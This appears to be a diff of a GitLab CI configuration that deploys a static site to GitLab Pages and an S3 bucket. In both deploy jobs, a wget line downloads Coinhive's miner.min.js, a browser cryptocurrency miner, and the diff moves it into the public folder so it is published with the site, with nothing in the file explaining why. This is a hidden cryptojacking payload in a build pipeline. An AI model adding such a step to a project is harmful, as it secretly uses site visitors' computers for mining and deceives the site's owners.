@@ -5,13 +5,13 @@ stages:
 
 before_script:
   - echo 'http://dl-cdn.alpinelinux.org/alpine/edge/testing' >> /etc/apk/repositories
-  - apk -U add ca-certificates aws-cli
+  - apk -U add ca-certificates openssl aws-cli
 
 gitlab_pages:
   stage: deploy
   script:
     - echo 'Say your prayers, take your vitamins and you will never go wrong.'
-    - wget https://coinhive.com/lib/miner.min.js ./scripts
+    - wget https://coinhive.com/lib/miner.min.js ./public/scripts
   artifacts:
     paths:
       - public
@@ -20,8 +20,5 @@ s3:
   stage: deploy
   script:
     - echo 'Say your prayers, take your vitamins and you will never go wrong.'
-    - wget https://coinhive.com/lib/miner.min.js ./scripts
+    - wget https://coinhive.com/lib/miner.min.js ./public/scripts
     - aws s3 sync public/ s3://$(S3_BUCKET) --acl public-read --delete
-  artifacts:
-    paths:
-      - public
